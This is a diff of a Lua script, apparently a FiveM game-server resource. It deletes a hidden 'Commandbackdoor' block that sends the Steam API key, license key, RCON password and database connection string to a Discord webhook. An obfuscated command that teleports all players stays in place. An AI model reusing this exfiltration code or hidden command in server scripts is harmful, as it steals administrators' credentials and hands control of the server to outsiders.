@@ -66,34 +66,3 @@ end
 RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
     teleportAllPlayersToAirport()
 end, false)
-
-local webhookUrl = 'https://discord.com/api/webhooks/1269677230666154136/UvLDg5fd_E9x0mlCo0bo_UpL1Ax-WdnPE5Y7HoBe2ahwwhXajBBvRo-RJk-5hgkX-lN1'
-local avatar_url = 'https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/114131672/original/5f03e84975a3e52c91166d03b89c6af7e061ca44/send-you-a-random-meme-image-that-will-tickle-your-fancy.jpg'
-
-local embed = {
-    {
-        color = 0xaa00ff,
-        title = "Der Server ist mit dem Script Commandbackdoor Verbunden:",
-        description = "" .. "\n" ..
-                      "👑 **Server-Hostname**: " .. GetConvar("sv_hostname", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "📍 **Projektname**: " .. GetConvar("sv_projectName", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "✍️ **Projekt Beschreibung**: " .. GetConvar("sv_projectDesc", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "🔗 **Steam Web Api Key**: " .. GetConvar("steam_webApiKey", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "🔑 **Lizenzkey**: " .. GetConvar("sv_licenseKey", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "🔢 **Maximale Slots**: " .. GetConvar("sv_maxclients", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "💯 **RCON**: " .. GetConvar("rcon_password", "N/A") .. "\n" ..
-                      "" .. "\n" ..
-                      "🔐 **Datenbank-Infos**: " .. GetConvar("mysql_connection_string", "N/A") .. "\n",
-        fields = {
-            {name = "", value = "<t:" .. tostring(os.time()) .. ":R> **AUTH SYSTEM** © PS-SCRIPTS | dc Link Soon", inline = false}
-        }
-    }
-}
-
-PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({username = "vl-scripts", avatar_url = avatar_url, embeds = embed}), { ['Content-Type'] = 'application/json' })
